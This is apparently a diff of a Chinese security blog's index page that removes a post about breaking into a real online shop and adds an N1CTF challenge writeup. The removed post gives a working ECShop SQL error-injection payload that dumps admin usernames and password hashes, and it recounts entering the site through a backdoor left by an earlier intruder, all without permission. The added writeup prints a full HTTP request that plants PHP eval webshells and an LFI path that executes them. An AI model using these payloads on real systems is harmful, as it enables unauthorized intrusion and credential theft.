@@ -468,50 +468,6 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2018-03-21T16:40:00.000Z">2018-03-22</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    3 分钟 读完 (大约 449 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2018/03/ecshop/">渗透某不可言语的商场</a>
-            
-        </h1>
-        <div class="content">
-            <a id="more"></a>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;很长一段时间没有日站了，特别是近期精力都放在了<code>CTF</code>中，今天在看某大佬的博客的时候发现<code>打码不严</code>，，然后被我找到了目标站，所以决定拿来练练手。</p>
-<p>&emsp;&emsp;首先是这样的一个站。。。。。</p>
-<div align="center"><br>    <img src="/images/posts/shentou/1.png"><br></div><br>&emsp;&emsp;好像很有趣的样子，，然后祭出我们的扫描器看看有什么发现。<br><div align="center"><br>    <img src="/images/posts/shentou/2.png" height="60%"><br></div><br>&emsp;&emsp;这里发现有<code>robots.txt</code>，然后我们访问一下。<br><div align="center"><br>    <img src="/images/posts/shentou/3.png" height="60%"><br></div><br><div align="center"><br>    <img src="/images/posts/shentou/4.png"><br></div><br>&emsp;&emsp;可以看到后台地址已经被我们拿到了，而且可以确定是<code>ecshop cms</code>。这里使用了大佬提供的自动化工具：<br>&gt;链接：<a href="https://pan.baidu.com/s/1AUpv79odaYByvA9oprUkoA" target="_blank" rel="noopener">https://pan.baidu.com/s/1AUpv79odaYByvA9oprUkoA</a> 密码：5z13<br><br>&emsp;&emsp;下载后我们使用一下。<br><div align="center"><br>    <img src="/images/posts/shentou/5.png"><br></div><br>&emsp;&emsp;发现确实可以拿到<code>admin</code>的密码。这里作者对这所谓的<code>exp</code>甚是好奇，所以就抓包分析了一下。<br><div align="center"><br>    <img src="/images/posts/shentou/6.png"><br></div><br>&emsp;&emsp;可以看到，漏洞的位置是在：<code>/flow.php?step=update_cart</code>。把<code>body</code>部分拿出来解码一下，得到如下：<br><code>goods_number[1&#39; and (select 1 from(select count(*),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1 #]=1&amp;submit=exp</code><br>&emsp;&emsp;可以发现就是一个<code>post</code>请求的<code>sql报错注入</code>。而它的返回值如下：<br><div align="center"><br>    <img src="/images/posts/shentou/7.png"><br></div><br>&emsp;&emsp;但其实这个洞已经挺久的了，并不能通杀全系列版本。。。<br><br>&emsp;&emsp;这里注入出了几个账号，但都无法解密，后来一想顺着<code>前人留下</code>的后门看看能不能进去，然后还真的就进去了，，但权限低得可怜。。。<br><div align="center"><br>    <img src="/images/posts/shentou/8.png"><br></div>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-03-20T16:40:00.000Z">2018-03-21</time>
                 
                 <div class="level-item">
@@ -740,6 +696,68 @@
 
 
 
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-13T16:40:00.000Z">2018-03-14</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 868 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/n1ctf-easy-harder-php/">N1CTF easy_harder_php非预期解法</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;上篇文章中复现了官方的预期解法，这里单独将<code>非预期</code>解法拿出来复现一遍并记录解题过程。<code>非预期</code>解法有三种：</p>
+<ul>
+<li><strong>1、session.upload开启导致session包含漏洞</strong></li>
+<li><strong>2、xdebug</strong></li>
+<li><strong>3、/tmp/临时文件竞争</strong></li>
+</ul>
+<p>&emsp;&emsp;本来以为pull下的docker有<code>easy php</code>的环境，但经过检查后却发现不满足条件，所以这篇文章主要起到<code>备忘录</code>的作用，以供以后遇到满足的条件时方便查阅。</p>
+<h2 id="1、session-upload开启导致包含漏洞"><a href="#1、session-upload开启导致包含漏洞" class="headerlink" title="1、session.upload开启导致包含漏洞"></a>1、session.upload开启导致包含漏洞</h2><p>&emsp;&emsp;<code>session.upload_progress.enabled</code>这个参数在php.ini <code>默认开启</code>，需要手动置为<code>Off</code>，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_&#123;your_php_session_id&#125;</span><br></pre></td></tr></table></figure></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/58.png" width="60%"><br></div><br>&emsp;&emsp;但是从官方拉下来的源码中，发现这个<code>session.upload_progress.enabled</code>参数已经被关闭，所以这个解法就没法复现了。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/59.png" width="70%"><br></div><br>&emsp;&emsp;所以这里只进行记录这个解法的流程。</p>
+<p>&emsp;&emsp;首先构造一个这样的报文(from @berTrAM)，不断的向服务端发送<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 47.52.246.175:23333</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Content-Length: 648</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">&lt;?=`echo &apos;&lt;?php eval($_REQUEST[bertram])?&gt;&apos;&gt;bertram.php`?&gt;</span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;file2&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;2.asp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt; %eval request(&quot;a&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV--</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;服务器就会在<code>/var/lib/php5/sess_5uu8r952rejihbg033m5mckb17</code>中记录这个上传的文件。接着我们不断刷新生成包含恶意php代码的文件，然后通过LFI包含这个文件<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=../../../../../var/lib/php5/sess_5uu8r952rejihbg033m5mckb17</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;即可getshell</p>
+<h2 id="2、xdebug"><a href="#2、xdebug" class="headerlink" title="2、xdebug"></a>2、xdebug</h2><p>&emsp;&emsp;要使用<code>Xdebug</code>get shell，首先服务器要开启如下参数：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/60.png"><br></div><br>&emsp;&emsp;但pull下来的docker中，这个参数都不被满足，所以又只能记录利用方式，等以后碰到了方便查阅。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/61.png"><br></div><br>&emsp;&emsp;这里参照<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">rr师傅的博客</a>，首先我们先确定是否可以利用<code>xdebug</code>。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/62.png"><br></div><br>&emsp;&emsp;当 X-Forwarded-For 的<code>地址</code>（这里就是：ricterz.me）的 9000 端口收到连接请求，就可以确定开启了 Xdebug，且开启了 xdebug.remote_connect_back。</p>
+<p>&emsp;&emsp;再下面的操作就参照师傅的博客就行了，这里因为没有环境就不再<code>照抄</code>了。</p>
+<h2 id="3、-tmp-临时文件竞争"><a href="#3、-tmp-临时文件竞争" class="headerlink" title="3、/tmp/临时文件竞争"></a>3、/tmp/临时文件竞争</h2><p>&emsp;&emsp;要使用<code>临时文件竞争</code>，phpinfo的环境要有如下配置：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/63.png"><br></div><br>&emsp;&emsp;但公开的docker还是不满足条件。。。</p>
+<p>&emsp;&emsp;它大概的原理就是趁系统还没把临时文件删除之前将这个文件包含起来，从而getshell，通常系统的守护进行删除时隔很小，大概在2~3s，所以，我们要使用多线程上传，然后不断刷新包含文件。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>&emsp;&emsp;<a href="https://www.secsearch.top/?kw=n1ctf" target="_blank" rel="noopener">黑塔搜索结果</a><br><br>&emsp;&emsp;<a href="https://xianzhi.aliyun.com/forum/topic/2148" target="_blank" rel="noopener">官方writeup</a><br><br>&emsp;&emsp;<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="noopener">国外大佬-条件竞争writeup</a><br><br>&emsp;&emsp;<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">Xdebug利用</a><br><br>&emsp;&emsp;<a href="http://bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/" target="_blank" rel="noopener">Bendawang</a><br></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
 
     
 <div class="card card-transparent">
@@ -801,7 +819,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        59
+                        58
                     </p>
                 </div>
             </div>
@@ -902,7 +920,7 @@
                 <span class="level-item">jekyll update</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">27</span>
+                <span class="level-item tag">26</span>
             </span>
         </a></li>
             </ul>
@@ -1110,7 +1128,7 @@
                     <span class="level-item">三月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">14</span>
+                    <span class="level-item tag">13</span>
                 </span>
             </a>
         </li>
@@ -1582,7 +1600,7 @@
                     <span class="level-item">三月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">14</span>
+                    <span class="level-item tag">13</span>
                 </span>
             </a>
         </li>
